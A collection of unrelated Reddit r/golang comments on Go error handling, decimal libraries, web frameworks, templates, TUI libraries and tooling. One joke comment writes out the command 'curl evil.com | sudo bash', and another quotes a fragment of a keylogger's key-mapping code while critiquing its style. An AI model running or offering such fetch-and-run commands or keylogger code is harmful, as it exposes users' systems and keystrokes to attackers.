If you follow the social media sites like Twitter and Google+, you’ll have noticed that rather than use the full URL we use a nice friendly shortened one like t.co/EvDSyOOPTH. Wouldn’t be great to generate your own shortened URLs inside your own domain? Follow up this small post and learn how you can create your own URL Shortener Service with Go: https://medium.com/@kataras/a-url-shortener-service-using-go-iris-and-bolt-4182f0b00ae7
manual connection doesn't scale to these kind of architectures: http://talks.godoc.org/github.com/sbinet/talks/2017/20170213-go-diana-hep/talk.slide#29 and that's just a simple detector simulation. for full blown HEP data reconstruction: https://indico.cern.ch/event/279648/sessions/143753/attachments/512195/706876/IEEE_2012_Higgs_Software_DavidRousseau_final.pdf (page 4) I'd like to add at some point is for `fwk` to detect data flow cycles or holes in the data flow, before running the application and getting a "all goroutines are asleep" panic. also a check for type impedance mismatch (task 1 publishes a `int64` under "key-foo", task 2 reads a `uint64` at "key-foo") would be handy :)
Seeding the randomizer every run is bad because the attacker can guess future output by just figuring out how long it takes for you to process when they send you the message.
What? You are using a whole framework as a dependency to create a simple URL shortener? Who in the right mind would ever do th... oh wait. It's kataras, nevermind. Nice try.
Nice, that's some nice DAGs there! :) But, don't the string-based way to describe the connections still require the same amount of information to be specified? Or, am I missing something? (Also, AFAIS, there's nothing preventing from automating the creation of "manual" connections either, if the info is just available in some easy to parse format...)
That's a good real world example, thanks :)
yes, same amount. but that can be more easily composed as the connecting piece does not have to be created and then filed at each spot. it's a "name" that just needs to be filed "inside" the task. it's a bit more declarative. it's a bit more self-contained. inserting a new node in the graph is a bit less work (you still have to adapt the 2 (or more) nodes at the seams) at scale, that shows :)
Wow, @kataras is back here. Did I miss something?
Wat
This is not what context is meant for, or what Read and Write are meant for. There are hundreds of ways to stop using a Conn when a context is canceled that won't have the severe downsides I mention here. Just thought someone should let you know the lack of this feature isn't strange, the desire for it is.
wow, since then github issues have been completely disabled on the project too. 
Thanks for sharing your work. &gt; you don't have to painfully connect all the nodes by hand. This is indeed a big plus for large networks. OTOH, the drawback of having a framework handle all this behind the scenes is that there is usually quite some reflection involved (read: "magic" behavior paired with possible performance penalties) - at least this what I have seen when peeking into a couple of FBP frameworks. 
what saves `fwk` (I think) is that HEP DAGs usually have heavy CPU crunching tasks that dwarf the cost of a type assertion. but you are right: one can't have one's cake and eat it.
My Hugo web site. I tried a new theme, and template rendering for all the content made it take 2 minutes to build the site, compared to ~5 seconds for the old (much simpler) template.
I would just use conversion. It is very likey that future Go implementations could optimize away the allocations, just using the backing array of the string as the backing array of the slice. Also, this conversion is already highly optimized within the runtime. Unless your strings are colossal, or you are doing many string conversions(majority of the workload), then letting the runtime handle this conversion is your best option.
Not exactly homework, lol. Yes, the code is already pretty clean, but what if there were 3 or 4? I am just wondering what other professionals are doing. I don't like functions with multiple return statements in general. 
Awesome idea. I really like it
 func (client *APIClient) GetLocationsByDistance() (string, error) { //for now just return straight from server locations, _ := client.getLocationsFromServer() data, _ := json.Marshal(locations) return string(data), nil } (please don't do this.)
Maybe there is something people can use in this project of mine, I am getting out of the malware biz and going to more legit programs... I know i am a shit coder, i learned mainly from Google and just kinda went as i learned... Its bad. But it works.
I think the idea with node cluster module is not killing process after it's done but have N amount of child processes running all the time and they being handling operations. Therefore, forking happens only at the app start-up.
https://github.com/tcard/pluginunmarshal
Oh how I miss C/C++. It looks great and I hope you have great success. If you ever post video please let me know as it would be great to see the results.
There is a solution to this using what are essentially "maybe monads". Here is a complete example (the "error" case emulated here is if you pass in a string that is not a valid integer). https://play.golang.org/p/-lOEmguvEk It ends up looking like this: func (client *APIClient) GetLocationsByDistance() (string, error) { //for now just return straight from server locations := client.getLocationsFromServer() data := locations.Marshal() return data.Unbox() }
I've seen https://github.com/shopspring/decimal recommended for this purpose before (on this subreddit, and on the GitHub issue linked from the blog post). Any comment on what made it unsuitable / how it compares?
I believe a lot of the dislike of multiple returns come from an overzealous adherence too Dijkstra's Single Entry, Single Exit paper. See this [SO question](http://softwareengineering.stackexchange.com/a/118793) for more on that. I hadn't even realized it refernecing returning to different locations, not multiple exit points. Either way, this has become an often recited axiom in school. Where did that leave us? Dijkstra was advocating code that was easier to reason about and debug. Applying that to Go and other modern languages gives me my preferred style. I want to easily spot where a function exits. I want a single exit with a value. This allows me to easily add logging with the return value at the end of a function. I want to return early and often for errors. This means I don't need a lot of nested blocks of code, each of each checking for a other error. But to easily figure out where the function returns, each error must be unique. And no, the line number doesn't count. Those change to frequently. I want to errors that say failed to open file, then failed to read file, then failed to parse Jason from file, then an error saying a required field is missing. From those errors, I can easily reason about where the function exited.
So a malware coder wants me to install and try something on my own computer... seems legit!
Adding logging to your return statements even when there are multiple exits is easy. func LogMe() (n string) { defer func(){ fmt.Println(n) }() if 1 &gt; 2 { return "impossible" } return "good" }
Sorry I didn't meant to be rude or negative :) I know it was to give us your code, thank you. But you have to admit this looks funny taken in that angle!?
Thanks for sharing /r/netsec malware or a few others may also be interested
What about go-swagger? It appears to be able to generate the swagger spec from code comments; sure, not as nice as generating from actual code, but pretty close.
go-swagger should support both use cases. you can generate a server (which is just middleware for the http lib) and then you can edit that code and generate a spec from it. You could then use that spec to generate a server again which should be equivalent to what you had already
No. The stdlib has arbitrary-precision integer, floating point, and rational types. This package is a decimal type, which can perform accurate operations on decimals. The `big.Float` type, since it uses a binary representation, will sometimes result in values that are slightly off. This is why you can add `0.1` repeatedly and sometimes get values like `0.9000000000001`. Decimal-based packages prevent this problem.
Down voted? This community is so confusing.
Hey, maintainer of shopspring/decimal here. Don't want to poo poo your library because open source contributions rock but would have loved to have taken PRs to fix the issues you surfaced with our Decimal library rather than have the community split with another way to solve the same problem. Our library has been battle-tested and in production since 2015 and this is the first I've heard of those issues. Will certainly investigate and resolve (and was able to reproduce from your code snippet above, thanks!). 
There were also some fundamental goal differences. For example, https://github.com/shopspring/decimal/issues/25 describes not wanting to change the API so that it never panics. https://github.com/shopspring/decimal/issues/19 describes a feature we wanted but was also rejected. From a practical perspective, we needed a package we could improve quickly, fundamentally, and without being blocked by an external person (that is, external to our company). The freedom of having our own was important.
big.Rat may theoretically be able to produce all the same values a decimal can, but at increased complexity. Decimals are useful when you have a problem dealing with human-sized numbers. If you have a problem that needs to have, say, exactly 2 decimal digits after the `.` (like money, or calculations with known significant figures), this is straightforward to do with a decimal representation because there is an exponent field. big.Rat would make determining exactly how to make that cutoff tricky. There may be better examples of which I'm unaware.
Reason I have the separate commands file it to have it easily modifiable by others than me. edit: this actually might be exactly what I was looking for though.
Working on that now.
But yaml is heirarcachly structured, map[string]string doesn't reflect that.
Oh I was just writing a comment for you and it was deleted, was just going to say having a WithSource method might be nice so someone could provide a CSPRNG. But in your defense uuid (including v4) should be assumed to use PRNG and you specify that clearly in the docs. Also maybe see your rng with crypto rand instead of date, not for security but for decreased chance of collision.
/u/jgillich is honestly applauding you for releasing that code. Yay for writing code. You are way ahead of 90% of people who don't understand the first thing about computers or the internet. ("It's a series of Tubes!") But if you *just* write code, you are a coder. When coders see any problem, they think the solution is to "write more code". They end up with a giant pile of code. Like this: case 0x42: if caps || shift { tmpKeylog += "B" } else { tmpKeylog += "b" } case 0x43: if caps || shift { tmpKeylog += "C" } else { tmpKeylog += "c" } A programmer or software engineer studies the *craft* of programming -- Can I make this code less repetitive? Can I help future maintainers not have to inspect every line of this code closely to ensure there are no mistakes? Is there a way to make the code more elegant? Can I leverage knowledge and experience in algorithms/data structures/encoding schemes to short-circuit some computation? Can I see any patterns in the code that I could (re)factor out? Programmers don't start at a keyboard. They start with a pencil and paper, and think deeply about the goal and how to express the solution in code. They generate multiple solutions in their mind, then evaluate the trade-offs, considering ease of implementation, maintainability, speed, memory usage, etc. Maybe you could construct an array with two strings (one "A-Z" and the other "a-z"), then index the array with 0=no shift, 1=shift, then index the byte in the string with `KEY - 0x40` as an offset? Or maybe you could look deeper and notice the relationship between letters in the ASCII table, and realize that the KEY input can be your output for many of the letters, just subtracting 0x20 if shift is being pressed. Every programmer starts their journey as a user, poking buttons and looking to see what happens, then as a coder, writing code to get things done and giddy at their own power to write any program in the universe. But a true master accomplishes their goal with minimum effort, no wasted energy or movement, no extra lines of code. Oh, and their code has tests. You'll learn about that someday. :) But don't feel dumb -- not everyone wants to level up along the programming dimension. If you are happy with your coding skills and would rather spend your time learning other things, that's fine too. Hopefully some programmers will send you some pull requests and improve your code without you lifting a finger. (That's smart!) Good luck on your journey, /u/SaturnsVoid
Playing devil's advocate: Why bother writing all that code when you can just post "Hey, just I wrote this cool new tool that is both a dessert topping and a floor wax. You are going to love it! You can install it via `curl evil.com | sudo bash`."
It is great news, but why is that it cannot find simple builtin java classes to use in golang? Like I used *java.lang.Float*, and *gobind* can't find the class. I've asked on [github](https://github.com/golang/go/issues/17945#issuecomment-285597585) but no one answered yet. When it must be somehow declared in the gradle build script (or some other workaround), then it would be great to have the description, how to do it, in the documentation, or in the error output when generating the bindings. Not just *cannot find package "Java/java/lang/Float" in any of ...*
just saying, but, with `gopy`, you don't have to make your package a `main` package *and* it automatically handles converting Go errors into Python exceptions :) https://github.com/go-python/gopy
I made this just to handle a simple case of a single level. the goal was simply to store key value pairs
I would argue Clojure's handling of concurrency is at least as good. (Not much of a surprise since it's heavily inspired by Go).
You could create a new container type that manages the slice internally and then hold pointer to that type in the map. type Conatiner struct { list []*sometype } func (c *Container) Append(s *sometype) { if c.list == nil { c.list = []*sometype{} } c.list = append(c.list, s) } And then: i := new(some type) If cache, ok := items["key"]; ok { cache.Append(I) }
So simple, just skipped right passed me. Too much time solving a simple problem lol. Thanks
Fascinating. I had a hunch about both Go and Vue... that makes me feel kinda good, lol. 
Regardless if we fully agree I respect you pivoting to a alternative implementation. I only posted the Read method because it could be easily extrapolated. In general I think your new approach is much more reasonable because the interface remains intact so any feedback would be just be personal opinion and fit different use cases. You will notice in the stdlib the same the approach I posted is used, from io specifically there is io.LimitedReader and io.TeeReader. The reason creating wrapper core primitives is nice is because you can benefit from the pattern you like from all sorts of other places like json.NewDecoder could wrap a File with a io.Buffer and ContextReader. So for your new approach I would say thumbs up, but it might be good to implement it using. pkg.Context{Read|Writ}er(ctx, io.{Read|Writ}er) io.Re.... Then you can use io.Copy and io.ReadFull implementations, you could always make a wrapper around those like you posted that just wrapper the incoming reader with a ContextReader. You could do this with zero allocs by stack allocating I think since its just two words. Have fun.
The interesting thing is I've only dabbled in react and Vue a little bit. So whether it's only my naivety or not, Vue just made sense way more to me, even though there's some conceptual similarity between the two. Also when I was trying to learn react it was a very awkward transition period between the new version of JavaScript and jsx, so every tutorial you looked at was totally different setup and syntax. Hopefully when I look at it again soon there's some decent consolidation. +1 for JavaScript ecosystem. :c
Yeah, I don't think staying on a workhorse language is blog worthy. No one is going to click on "Why this enterprise company choose Java." That said, getting an accurate picture of new projects being started would take serious research dollars. 
The just use yaml unmarshal directly on a map[string]string and your done. Why all the extra code?
I wouldn't change a thing, this is how error handling is done in Go.
Anyone who has used go already knows it has a popular future. 
try it with non string types, it excluded them from the map, I had to use a type switch to ensure I got the non string types in the maps as strings
Thats called type safety, its a good thing.
Indeed. I like to be explicit. Having nil check is saying "this type is designed to be used without any special setup." But you are correct :) 
Apparently, it was just one company (Uber), but the move generated a ton of attention, precisely because it was so unusual.
FWIW, learning Vue.js first made it easier for me to learn Angular. Angular can bring an overwhelming amount of complexity, and Vue's simplicity made it easier to grasp, but the two frameworks share a lot of concepts. And when you dig into the inner working of Vue, I understand it works a lot like React's virtual dom, when it does dom updates.
here is a link for my [resume](https://drive.google.com/file/d/0B1xXxLZ2Tw_5VkVRTU83a1lqTkk/view?usp=sharing) to give you a better idea on my experience 
I touched on this in the original post, but go-swagger doesn't have the features I'm asking about. The go-restful plugin is a vast improvement for my use case because I don't need to worry about updating a json file or code comments every time I change a model. The server generation is not what I'm asking for - I'm talking about a plugin generates and serves the apidocs.json file at runtime, an serves the swagger ui. 
True, but that also comes with the overhead of running swaggergen every time I make a change. A big win with the go-restful approach is that it does this at runtime. 
The idea of templates is that you calculate the data you need to show on the page on the server and then you "throw" the data inside the template in the form of a Go struct. Then you print the data you need by using `{{ . }}` and if you need to print the struct field Name then you use `{{ .Name }}`. You can also do more advanced stuff by creating custom functions that will allow you to transform that data in the template. Assuming your struct has a Names field which is a `[]string`. fns = template.FuncMap{ "join": strings.Join, } Then you can use the function name like this: `{{join .Names ", "}}` I wrote an example to demonstrate: https://play.golang.org/p/MIqD3A11Dm Your question about running a Go function onclick is not what you want. This is supposed to run a javascript function on the client. If you really want to use onclick to fire a Go function on the server then you could make on click fire a Javascript function which would make an AJAX call to the Go server to run the Go function. If you would like to use templates then I'd recommend to stick to the standard library `html/template`. If you would like to not use templates then you should build the API in Go then use a JS framework like React, Polymer, Vue etc. to display the data that the Go API returns on the frontend. This will keep everything separated.
&gt; Let's say that I have a go struct declared in my html template that holds some variables like loggedIn, color, etc. Is it possible to make the onclick tag to change for example the value of the variable? Do you mean that when the user clicks on a thing, you want the color to change on the client side? Or are you actually asking for values within Go structs to change when the template is rendered, that is, that the act of rendering a Go template causes arbitrary modifications to Go data structures in the time period while the HTML template is being rendered and has not yet even been sent to the user? I am currently trying to diagnose whether you've got an unclear understanding of what is on the server vs. what is on the client. Is your previous JS experience with Meteor by any chance, or some other framework that prides itself on hiding the difference? (As opposed to something like React, which does not try to bridge the gap.)
A lot of c / c++ / python/ perl /java programmers out there who will pick it up in no time. Seems like a no brainer its going to be popular. 
I'm coming from react js. In React you got something like state where you kept all the dynamic data there. I'm looking to make a struct that keeps all the state and modifity with onclick, onhover events ;)
I read this as pretty tongue in cheek. Nice use of tools, but the fundamental assumptions are pretty bad. The only real thing to take away from this is that there are plenty of articles title "why we switched from X to go" and few that are title "why we switched from go to X". Makes sense, it's a pretty young language.
I have no idea what is a "template engine that compiles to go", can you add a few links?
For the larger methods, you'll find that you end up naturally refactoring blocks of code into other methods, which may have a few of these error returns. That helps somewhat, but ultimately, the devil must have his due.
Anything but https://github.com/kataras/iris
The standard advice we give to newcomers is... don't. Start with the standard library's net/http. It's way better than the equivalent in most other languages. You'll be surprised how far that will get you. If and when you find you have a specific need that isn't solved adaquately by the stdlib (say advanced muxing), find a specific library that solves that specific problem (like [gorilla/mux](https://github.com/gorilla/mux)). Frameworks can be nice, but they come at a cost. Your code often stops playing as nicely with libraries outside of the framework, you pull in lots of dependencies you don't actually need, you may even end up writing boilerplate to support features you don't care about. By starting with just the standard lib and only reaching for 3rd party libraries to solve specific problems, you'll keep your code lean, mean, and flexible. When you do need some 3rd party code, https://github.com/avelino/awesome-go/blob/master/README.md#web-frameworks is a great place to look. 
Super cool! I'm curious if you plan on making it at all interactive. Our protein design API at [Serotiny](https://serotiny.bio) is written in Go. We have a crude PDB interpreter to help build our protein's shapes from their structural 'shadow'. And it serves its purpose, but it certainly does not spit out such pretty renderings.
I love this guy's channel. He explains golang in a way that just works for me. I strongly suggest you check out his other [videos](https://www.youtube.com/channel/UC_BzFbxG2za3bp5NRRRXJSw/videos)
I believe I was asked about this before, can you describe what the flow you are looking for is?
That's pretty unconstructive. Do you have recommendations? I'd take a look at goa. I haven't used it but hear good things.
go-kit microservices gin or chi for web
&gt; I am just wondering what other professionals are doing. The ones who mind the boilerplate don't using Go.
If you really want to use Go on the client side, you might be able to hack something together with gopher.js. However, I wouldn't recommend it, since you lose most of the benefits of Go that way and it's a bit of a square peg/round hole situation.
I work with stat research and this sort of data-distortion frightens me. I mean really, changing missing values to zeros, that's just plain dishonesty.
The option of installing a complete Go env through go get is new to me. [Installing from source](https://golang.org/doc/install/source) could be a solution.
I like the logos, gives it an artistic touch.
Tried that, segfaults in ##### ../misc/cgo/testplugin ./test.bash: line 34: 21001 Segmentation fault LD_LIBRARY_PATH=$(pwd) ./host 2017/03/17 Failed: exit status 139 
Yup, looks like it's only for beta: https://godoc.org/golang.org/x/build/version
How does this differ from Consul? It looks interesting, but there's no reason to use it if there aren't any advantages over consul.
To extend this list - what I often see in recommendations is go-kit or micro gin or chi or echo 
Have you read a lot of Linus rants? ;-)
My boss asked me why I was posting this question on reddit, this is precisely why. Thanks so much man, really appreciate the in depth answer :) I didn't want to sit down and just hack a solution through, this needs to be prod-grade so I'm always looking for the way go does things. I knew while I was running my tests that I was losing the value as the block exited, thanks to not using pointers correctly. Pointers are a little of a mind bend for me (Java background), and googling it pretty much just describes the mechanics, but not the idiomatically correct way of doing it. One of the reasons I love this language so much was Rob Pike's statement around (paraphrased) that "Languages are complicated. We wanted to build a complex and powerful tool that looks identical in most forms". So just hacking away wasn't really doing anybody any favors. But your answer makes a lot of sense (thanks again for all the effort!) and it does feel like the more correct approach. 
Give go-micro a try :) https://micro.mu/blog/2016/03/28/go-micro.html
It seems like you are interested in building an app using http API with a JS framework as the front end, in that case, the html page uses VueJS and you'll use Vue's functions to click a button, I have written an app using Go as backend and Vue as frontend, read that code and you'll get your answers https://github.com/thewhitetulip/Tasks-vue If you are interested in learning VueJS, then you can read my tutorial here: https://github.com/thewhitetulip/intro-to-vuejs in detail: when you have a function in Go like "store data into db", you wrap that beyond an HTTP API, that would be "PUT /insert name=sherlock&amp;value=somethingelse", then you use a frontend framework to call the http api and change the html page dynamically. You aren't supposed to use onclick, if you need to use them, then either you are using the framework incorrectly _or_ the framework you have chosen isn't really framework. There is absolutely no need to pre-compile templates, they aren't that slow, there are plenty of optimizations you can do later, but the first focus should be in _building_ something, only after you have a correctly working version should you think about optimizing the app.
This! Thank you man!
Maybe try godeb? https://github.com/niemeyer/godeb I use it to install the latest go version as a debian package, but i'm not entirely sure if it supports ARM
This looks great! We use docker-compose a lot and it's great but we do have some heinous bash scripts to cobble things together; this might help us write something a bit more robust
Did my suggestion work? People appreciate feedback when they try to help, and if it did work a simple thank you shouldn't be too much to expect.
Not only i'll keep the return but i will add context info to the err before returning (with pkg.errors) . Like that you don't feel "just returning". It will help the debug and the documentation of the code.
Vue is hot for sure, difinitly better than react. There's also an ui library from ebay open source that seems to do even better ;). Take a look here, I think that's the best choice and it has state manager out of the box http://markojs.com/
I appreciate the help, but unfortunately, I've not had the chance to try this out yet.
Funny coincidence - I planned my next blog post to be about TUI libs.I haven't done research yet, but these come to mind: jroimartin/gocui nsf/termbox-go gdamore/tcell gizak/termui (All hosted on GitHub) --- Edit: CUI -&gt; TUI
Anytime, thank you for the kind words, I really appreciate them. You're mind is in the right place. I have no doubt you'll be a rock-solid Go developer in less than a month (especially with previous experience).
haha yes it's classic.
Maybe try the steps described by /u/kostix. 
The term you are searching for is [TUI](https://en.wikipedia.org/wiki/Text-based_user_interface). 
Indeed the tour is the way to go. Idk why I started reading "Effective Go" but I believe that part to be a good read once you know some basics.
tl;dr If you set a signal stack and then exec from the non-main thread, the kernel doesn't reset that so your signal stack is now pointing to random memory in your process.
I have never joined onto one simply because I don't really know how. I also work with python alot and have also considered contributing there as well
GOROOT is different from GOPATH GOROOT is the path to the official go binaries/libs GOPATH is the base path to the source you write GOPATH/src/&lt;repo host&gt;/&lt;organization&gt;/&lt;project&gt; is usually how GOPATH is structured and you'd work out of the &lt;project&gt; folder
Thx! I'll be more careful in naming my project directories in the future. Oops, I meant GOPATH. Copy-paste err.
Vue is hot and easier than react, I don't know if it is better. Thanks for sharing the link but I'll stick with Vue, these days having a better software _and_ an active community is better than best software no community.
Just pick some project you'd like to contribute to and send in Issue request Pull requests they'll merge if they want, that's how you contribute.
I don't know if this is great, I wrote a tutorial! tutorial, go + webdev: http://github.com/thewhitetulip/web-dev-golang-anti-textbook/ youtube screencast: just webdev, doesn't teach Go. https://www.youtube.com/playlist?list=PL41psiCma00wgiTKkAZwJiwtLTdcyEyc4
Thx, looking great, especially gocui at first glance! =)
+1 for gizak/termui - it's used in [ctop](https://github.com/bcicen/ctop).
Will you post the post on this subreddit? I'm interested in what you have to say. A good overview would be great.
I did make a simple three.js viewer that you can interact with: https://www.michaelfogleman.com/static/ribbon/hemoglobin/ The mesh was generated in Go and just dumped to a file. 
That's really awesome! A buddy made a widget-able PDB viewer that also had sequence interaction which I really liked: https://jolecule.appspot.com/ The ability to zoom in on an acid (by means of sequence), and select an acid (and have the sequence highlight) was a super useful feature. Ultimately it'd be pretty amazing to get such such visualization into a design suite. But there is certainly a distance yet to go.
Very cool!
code looks good but i think maybe you're using too many indirections? maybe? in := new(Message) // in is now of type *Message Decode(&amp;in) // now you're passing **Message same goes for your encode..
Same segfault :(
Discussions Here: https://groups.google.com/forum/#!topic/golang-dev/JlQNvt2_YuE
I am writing a book inspired by Michael Hartl's Rails Tutorial titled Web Development with Go (https://www.usegolang.com). The book walks you from a super simple hello world application all the way to building a realistic photo gallery site like PixieSet. You can see a sample at https://www.usegolang.com/sample and if you email me (jon@calhoun.io) I can share some screencasts samples. You can also get a taste of my writing in general at https://www.calhoun.io Are there any other specific subjects you are looking for material on?
Yeah FreeBSD probably will never go to production. Can't believe there are still people wasting time on this "system"
I personally don't suggest to use go-kit because you have to write a lot of the duplicated code and interfaces with it. I'd suggest to have a try with gRPC, with Protocol Buffers, you can share the schemas between microservices without the pain.
If you are trying to render the templates with Go, then you would have to handle the click event with some libraries like: jQuery, Zepto.js in the client-side, then send the AJAX request to your server. But since people are using React.js or Vue.js nowadays, I don't see why you should use a template engine (server-side render), it'll make you hard to maintain the code and the structure in the future (if you are writing a large project). I would suggest you to head back and use React.js (or Vue.js), so you can easily to separate the front-end and the back-end, and make your Golang server as an purely API server. (That only cares about the functions, not views.)
As per shalard_doctor, Consul is a kv map with a service application layer written on top. The k/v map is resolved by the ~~Paxos~~ Raft algorithm. This uses IPv6 broadcast traffic which means: a) It's efficient at small networks b) It can't scale These assumptions are discussed when it mentioned it's for "edge computing". If you have a network of up to 50 - 500 (wild guess) servers / services. This would be ideal. 
35 minutes ago as of this comment: &gt; kostikbel commented 35 minutes ago &gt; As I noted to @steventh, I definitely able to reproduce the original memory corruption issue on the patched system. Also, somebody mentioned that the test code was stripped to only use fork() and still cause the issue. In other words, an issue is still there.
Nice work! 
Very neat! The example program seems to work, though it appears to have trouble connecting initially: ~ λ godet -responses -requests -verbose -version 2017/03/17 23:10:14 REQUEST: GET http://localhost:9222/json/list { } 2017/03/17 23:10:14 ERROR: Get http://localhost:9222/json/list: dial tcp [::1]:9222: getsockopt: connection refused REQUEST: GET http://localhost:9222/json/list { } 2017/03/17 23:10:14 connect Get http://localhost:9222/json/list: dial tcp [::1]:9222: getsockopt: connection refused 2017/03/17 23:10:15 REQUEST: GET http://localhost:9222/json/list { } 2017/03/17 23:10:15 RESPONSE: 200 OK { "Content-Length": [ "373" ], "Content-Type": [ "application/json; charset=UTF-8" ] } 2017/03/17 23:10:15 REQUEST: GET http://localhost:9222/json/version { } 2017/03/17 23:10:15 RESPONSE: 200 OK { "Content-Length": [ "277" ], "Content-Type": [ "application/json; charset=UTF-8" ] } struct { Browser: "", ProtocolVersion: "1.2", UserAgent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome Safari/537.36", V8Version: "5.7.492.65", WebKitVersion: "537.36 (@11f66db67ea1f20d200d6f9add50fc1c345d71f7)" } 2017/03/17 23:10:15 SEND {"id":0,"method":"Runtime.enable","params":null} 2017/03/17 23:10:15 EVENT Runtime.executionContextCreated {"context":{"id":1,"origin":"://","name":"","auxData":{"isDefault":true,"frameId":"29080.1"}}} 0 2017/03/17 23:10:15 REPLY 0 {} 2017/03/17 23:10:15 SEND {"id":1,"method":"Network.enable","params":null} 2017/03/17 23:10:15 REPLY 1 {} 2017/03/17 23:10:15 SEND {"id":2,"method":"Page.enable","params":null} 2017/03/17 23:10:15 REPLY 2 {} 2017/03/17 23:10:15 SEND {"id":3,"method":"DOM.enable","params":null} 2017/03/17 23:10:15 REPLY 3 {} 2017/03/17 23:10:15 SEND {"id":4,"method":"Log.enable","params":null} 2017/03/17 23:10:15 REPLY 4 {} 
Agreed! But, like any other software Free BSD also could have issues. We can't rule out the entire set of positives because of one negative. Right!
Hm. Am I missing something, or is this somewhat similar to https://github.com/knq/chromedp ?
To clarify, type assertion of interface{} to a concrete request type costs order of 100 nanoseconds. It's not a bottleneck or even worth talking about.
Consensus in consul is resolved using raft, not paxos.
Looks like [Rpi's ARMs are supported on 1.8](https://golang.org/doc/go1.8#ports).
Thanks for the clarification :)
So your example works because you defined message explicitly as a type with those two fields? Sorry if this question is dumb I just started reading up on go :) 
I work with Node and JS every day, and use Go for personal projects, and I would definitely recommend Go for this. 
yes, I am wrong there. Thanks for pointing that out! :) Removed that part from the comment.
No, the `Message` type was just left out of the question. It worked because I made the fields of `Message` public, meaning they can be accessed by code outside of the package in which it was defined. Fields are made public by starting their name with a capital letter. So in the original code, it would have looked like this: type Message struct { name string text string } That defines a struct with two, private fields. Mine capitalizes those field names: type Message struct { Name string Text string } So now they're readable/writable by any code that gets a value of that type. This is necessary because the `json` package *(or more accurately, the `reflect` package)* can only work with fields that it can access.
I agree with @ahacker16 except about hosting your application yourself; bundling also allows these assets to be served from memory instead of disk which will always be faster :)
Personally I use [go.rice](https://github.com/GeertJohan/go.rice) for all my embedding needs, it can also look at local FS so it would still allow for one to manually override templates and what not.
Thank you Jon that is valuable information. I'm actually interested in distributed self-healing systems like Kubernetes, which is why I'm learning Go. I've skimmed through your sample and plan on reading it more thoroughly in the short future
Never sign a CLA. A CLA is a red flag. The Go Tour. Effective Go.
Is there any chance I could convince you to include a matrix of which libs support which OSes in your blog post? The cross platform compatibility of Go is one of my favourite parts of the language, but I've pretty much given up finding something that works well across the platforms I use when it comes to terminal libs..
A CLA? What do you mean?
Good point! But for this I have to rely on the data that the lib owners provide. I can only test on macOS and maybe also on Linux if time permits. I have no Windows around, nor any other OSes.
That was my first thought too. Hopefully you can combine forces to build an awesome headless driver!
How easy is it to compose templates in the stdlib template package? That's one thing I thought it was missing when I looked at it, but I might have just missed it.
1) untar image from 2017-03-02-raspbian-jessie-lite.zip 2) Use Etcher-1.0.0-beta.19-linux-x64.zip to flash the image onto an sdcard 3) Mount the sdcard, and in the boot directory, add ssh by executing "touch ssh" and unmount sdcard 4) Place the sdcard in the Raspberry Pi and power up 5) On the host machine execute arp -a to find the new ip address of the Raspberry Pi 6) ssh to it: ssh pi@192.168.1.x, password is raspberry 7) sudo apt-get update 8) sudo apt-get install aptitude 9) sudo aptitude purge golang (if it's installed) 10) Follow Dave Cheney's steps to install go 1.5 on the Raspberry pi 11) Download the source for go 1.8 12) export GOROOT_BOOTSTRAP=location of go1.5 from step 10 13) ulimit -s 1024 (as Dave suggested) 14) sudo tar -C /usr/local -xf go1.8.src.tar.gz 15) sudo chown -R pi /usr/local/go 16) cd /usr/local/go/src 17) ./all.bash 18) go 1.8 can now be used as usual
Nice article! Minor correction, `runtime.LockOSThread()` needs to be executed in `init`, it's too late in `main` because by the time it gets executed, the thread might have already switched (in theory). So it must be in `init` to have a full guarantee. Source: https://github.com/golang/go/blob/32cb0ce65b39fc91923ac12a0a94f34b5dfd04be/src/runtime/proc.go#L132-L134. See [this example](https://github.com/go-gl/examples/blob/95da75be83d1bd063052f7d12c4fd5d44ab8df39/gl41core-cube/cube.go#L29).
&gt; didn't see an available client Did you see https://github.com/knq/chromedp?
Good call, I'll definitely update that. Thanks!
There are obviously type safety concerns, but, at least in Go kit, they're pretty tightly encapsulated, and fully verifiable with quite coarse wiring unit tests.
1) Install [Arch Linux ARM](https://archlinuxarm.org/platforms/armv8/broadcom/raspberry-pi-3) 2) sudo pacman -Syu go
This is awesome, I've been waiting for this for some time.
I looked around and missed this one. Thanks! 
Well, it needs to wait until the browser is ready. I had a choice of putting a sleep between the browser exec and the connect, or you retry the connect (and chose to retry every 500ms for a total of 5 seconds). 
Go was also at number 15 in the previous red monk rankings, which is pretty good considering Swift went up quite a bit. Their ranking process was also updated before this, I wonder if that's why there are so many times.
Use `1.` instead of `1)` so reddit applies list formatting.
nice
I see, simultaneous assignment like Python. Thanks for the tips, I still looking for more Go features.
If you don't mind me asking, how does it compare to https://github.com/rsc/c2go?
Easy. Not trivial. Check out block.
Alright, I personally prefer the *jade* style syntax rather than the braced syntax which is why I don't use *html/template*.
I don't think a simple syntax preference is enough to justify adding a whole dependency in a project but to each their own.
I can't think of many reasons to prefer a separate repo. Vendoring? Probably prefer an examples directory.
Sorry to sound harsh, but it's really bad that you're publishing a library like this without doing a little bit of basic research. This may really harm people using this. There is one, very important rule, when dealing with money in programming languages. **Don't use floats, never.** Create a decimal type, or store it in two ints, whatever. Just don't use floats. Inevitable representation errors lead to money being added or lost.
Code updated! Thank you!
cgo is not very complex at all. It has some extra rules and a bit of a performance loss is to be expected. I have done quite a bit of cgo for work (sorry! no sources!), and it works reasonably well and seemingly safely so far.
I agree it's not a great article but there's no need to be a jerk about it.
Previous discussed here: https://www.reddit.com/r/golang/comments/5zqggw/this_analysis_suggests_go_has_a_popular_future/
Don't take it seriously. It's written like that for humorous purposes only. No bad words were used and no animals were harmed in the process of making it.
Oh, yes, I just recall one other big thing regarding my choosing of a suitable TUI. Multitasking! Meaning, being able to start a separate go routine that could possibly also update the UI without issues. A bit more complex thing to test, but still. :)
[Why you should not use iris.](http://www.florinpatan.ro/2016/10/why-you-should-not-use-iris-for-your-go.html)
Your humor makes the Go community look like jerks in response to criticism. There's no need for it.
just what i thought, once your familar with pointers there's nothing to be scared of. I bet converting a proven / tested c code base a better fit for using cgo rather than converting it to go.
I've just looked at the TCP client/server and gotta say, this is great first code. You're doing pretty much everything right, and good job for reaching to package bufio to handle the reads and writes on the connection. A few small things - Constants don't get the ALLCAPS treatment in Go; they'd just be `host` and `port` - Better to avoid globals and have those defined in `func main`, or, better yet, taken as flags. - In the `if err != nil { log.Fatal }` block, better drop the `else` clause - Can you find a way to read in handleConnection that doesn't require allocating a fixed buffer?
